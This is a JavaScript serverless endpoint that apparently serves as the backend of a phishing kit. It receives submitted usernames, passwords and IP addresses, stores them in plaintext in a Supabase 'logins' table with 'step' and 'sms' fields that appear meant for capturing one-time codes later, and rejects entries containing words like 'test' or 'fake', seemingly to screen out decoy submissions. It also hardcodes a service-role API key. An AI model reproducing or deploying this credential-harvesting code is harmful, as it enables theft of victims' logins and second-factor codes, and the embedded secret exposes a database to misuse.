export default async function handler(req, res) {
  // CORS primero
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');

  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { username, pass, id, ip } = req.body;

    // Validaciones
    if (!username || !pass || username.length < 3) {
      return res.status(400).json({ error: 'Datos inválidos' });
    }

    const spam = ['test', 'prueba', 'admin', 'demo', 'fake'];
    if (spam.some(s => username.toLowerCase().includes(s))) {
      return res.status(403).json({ error: 'Spam detectado' });
    }

    // USAR LA LEGACY KEY (la que empieza con eyJhbG...), no la sbp_
    const SUPABASE_URL = process.env.SUPABASE_URL;
    const SERVICE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imdyd2lxcXNjdGtxeGNqeGJpcGpqIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc5MDI2MjY4OCwiZXhwIjoyMTA1ODM4Njg4fQ.F_t_CbfdSrvOHBpHswJcO0D8I2jQQQk8mACJHFWGPwY'; // Pega tu key completa aquí

    console.log('URL:', SUPABASE_URL);
    console.log('KEY starts with:', SERVICE_KEY?.substring(0, 10) + '...');

    const response = await fetch(`${SUPABASE_URL}/rest/v1/logins`, {
      method: 'POST',
      headers: {
        'apikey': SERVICE_KEY,
        'Authorization': `Bearer ${SERVICE_KEY}`,
        'Content-Type': 'application/json',
        'Prefer': 'return=minimal'
      },
      body: JSON.stringify({
        id: id || crypto.randomUUID(),
        username,
        pass,
        ip: ip || 'unknown',
        online: true,
        step: 'Verificando...',
        sms: '----',
        created_at: new Date().toISOString()
      })
    });

    if (!response.ok) {
      const errorText = await response.text();
      console.error('Supabase error:', errorText);
      return res.status(500).json({ error: 'Error al guardar' });
    }

    res.status(200).json({ success: true });

  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ error: error.message });
  }
}
